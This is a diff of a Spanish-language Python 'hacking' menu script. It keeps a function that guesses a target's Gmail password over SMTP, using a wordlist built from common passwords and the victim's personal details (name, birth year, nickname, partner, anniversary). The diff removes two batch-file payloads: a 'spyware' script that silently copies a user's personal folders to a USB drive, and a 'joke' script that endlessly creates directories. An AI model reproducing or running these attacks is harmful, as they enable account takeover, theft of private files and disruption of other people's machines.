@@ -4,39 +4,15 @@ import smtplib
 import subprocess
 import getpass
 import os
+import ftplib
 
 
-#///////////////////////////////////////////////////////////////////////////
-#  VARIABLES NECESARIAS:
-CONTENT1 ='''@echo off
-copy C:\Users\%USERNAME%\Pictures\*.* .\sofia\ 
-copy C:\Users\%USERNAME%\Destkop\*.* .\sofia\ 
-copy C:\Users\%USERNAME%\Downloads\*.* .\sofia\
-
-copy C:\Users\%USERNAME%\Documents\*.*.\sofia\ 
-copy C:\Users\%USERNAME%\Videos\*.*.\sofia\ 
-copy C:\Users\%USERNAME%\Music\*.* .\sofia\ '''
-CONTENT2 = '''@echo off
-:loop
-mkdir %random%
-color 20
-color 40
-color E0
-goto loop'''
-MSG1 = '''
-se va a crear un archivo.bat con un programa para copiar archivos 
-desde una usb...
-para que esto funcione debe de tener una usb con una carpeta llamada 'sofia'
-la cual se encuentre en el mismo directorio que el archivo que esta a punto de 
-crearse en la ruta {}'''.format(os.getcwd())
-MSG2 = "de momento solo hay un virus joke porque es muy tarde"
-#///////////////////////////////////////////////////////////////////////////
 
 def config():
 	conf = str()
 	while conf != 'r':
 		subprocess.call(["cmd.exe","/c","cls"])
-		conf = str(raw_input('''
+		conf = str(input('''
 		/////////////////////////////
 		Elige el color de las letras:
 		-----------------------------
@@ -54,39 +30,24 @@ def config():
 		elif conf == "a":
 			subprocess.call(["cmd.exe","/c","color e"])
 
-
-
-
-def filefactory(msg, content):
-	subprocess.call(["cmd.exe","/c","cls"])
-	print('''{}'''.format(msg))
-	getpass.getpass("presione enter para continuar...")
-	subprocess.call(["cmd.exe","/c","cls"])
-	filename = str(raw_input("introduzca el nombre del archivo (no agregue el .bat): "))
-	filename += ".bat"
-	file = open(filename, "w")
-	file.write('''{}'''.format(content))
-	file.close()
-
-
 def bforce():
 	data = ["123456","12345678","qwerty", "password", "123456789", "hola"]
 	subprocess.call(["cmd.exe","/c","cls"])
 	print("este algoritmo solo funciona con correos de gmail.")
-	email = str(raw_input("introduce el corre electronico de el objetivo: "))
-	name = str(raw_input("introduce el nombre de el objetivo: "))
+	email = str(input("introduce el corre electronico de el objetivo: "))
+	name = str(input("introduce el nombre de el objetivo: "))
 	data.append(name)
-	year = str(raw_input("introduce el año de nacimeinto de {}: ".format(name)))
+	year = str(input("introduce el año de nacimeinto de {}: ".format(name)))
 	data.append(year)
-	nickname = str(raw_input("cual es el apodo de {}? ".format(name)))
+	nickname = str(input("cual es el apodo de {}? ".format(name)))
 	data.append(nickname)
-	cpl = str(raw_input("{} tiene pareja? Y/N: ".format(name)))
+	cpl = str(input("{} tiene pareja? Y/N: ".format(name)))
 	if cpl == "y" or cpl == "Y":
 		data.append("iloveyou")
 		data.append("teamo")
-		couple = str(raw_input("como se llama la pareja de {}?: ".format(name)))
+		couple = str(input("como se llama la pareja de {}?: ".format(name)))
 		data.append(couple)
-		anniversary = str(raw_input("cuando es el aniversario de {} y {}? ".format(couple, name)))
+		anniversary = str(input("cuando es el aniversario de {} y {}? ".format(couple, name)))
 		data.append(anniversary)
 	server = smtplib.SMTP('smtp.gmail.com:587')
 	server.starttls()
@@ -103,15 +64,13 @@ def bforce():
 				break
 	getpass.getpass("presione enter para continuar...")
 
-def run(content1, content2, msg1, msg2):
+def run():
 	do = str()
 	while do != 'exit':
 		subprocess.call(["cmd.exe","/c","cls"])
-		do = str(raw_input('''
+		do = str(input('''
 			*************************
 			[f]uerza bruta
-			[s]pyware
-			[j]oke malware
 			[c]onfiguracion
 			-------------------------
 			para salir escribe "exit"
@@ -121,16 +80,12 @@ def run(content1, content2, msg1, msg2):
 		do == do.lower()
 		if do == "f":
 			bforce()
-		elif do == "s":
-		   filefactory(msg1, content1)
-		elif do == "j":
-			filefactory(msg2, content2)
 		elif do == "c":
 			config()
 
 
 if __name__ == '__main__':
-	run(CONTENT1, CONTENT2, MSG1, MSG2)
+	run()
 
 
 	
